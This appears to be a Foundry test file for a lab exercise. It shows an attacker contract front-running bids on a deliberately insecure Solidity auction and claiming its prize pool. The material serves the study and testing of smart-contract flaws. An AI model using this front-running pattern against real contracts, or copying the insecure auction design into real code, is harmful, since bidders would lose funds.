// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/InsecureAuction.sol";
import "../src/FrontRunner.sol";

contract FrontRunningTest is Test {
    InsecureAuction public auction;
    FrontRunner public attacker;

    address alice = makeAddr("alice");
    address bob   = makeAddr("bob");

    function setUp() public {
        auction = new InsecureAuction();
        attacker = new FrontRunner(address(auction));

        vm.deal(alice, 10 ether);
        vm.deal(bob,   10 ether);
        vm.deal(address(attacker), 10 ether);

        // Fund the prize pool
        vm.deal(address(auction), 10 ether);
        auction.fundPrize{value: 10 ether}();
    }

    // Attacker sees Alice's 1 ETH bid in mempool and front-runs with 1.1 ETH
    function test_FrontRunStealsAuction() public {
        // Alice submits bid (visible in mempool)
        vm.prank(alice);
        auction.bid{value: 1 ether}();
        assertEq(auction.highestBidder(), alice);
        assertEq(auction.highestBid(), 1 ether);

        // Attacker front-runs: bids 1.1 ETH before Alice's tx confirms
        vm.prank(address(attacker));
        attacker.attack{value: 1.1 ether}(1 ether);

        // Attacker is now highest bidder
        assertEq(auction.highestBidder(), address(attacker));
        assertEq(auction.highestBid(), 1.1 ether);

        // Attacker claims the 10 ETH prize
        uint256 attackerBefore = address(attacker).balance;
        vm.prank(address(attacker));
        attacker.claim();
        assertEq(address(attacker).balance, attackerBefore + 20 ether);
    }

    // Anyone can be front-run — Bob too
    function test_AnyoneCanBeFrontRun() public {
        vm.prank(bob);
        auction.bid{value: 2 ether}();

        vm.prank(address(attacker));
        attacker.attack{value: 2.1 ether}(2 ether);

        assertEq(auction.highestBidder(), address(attacker));
    }
}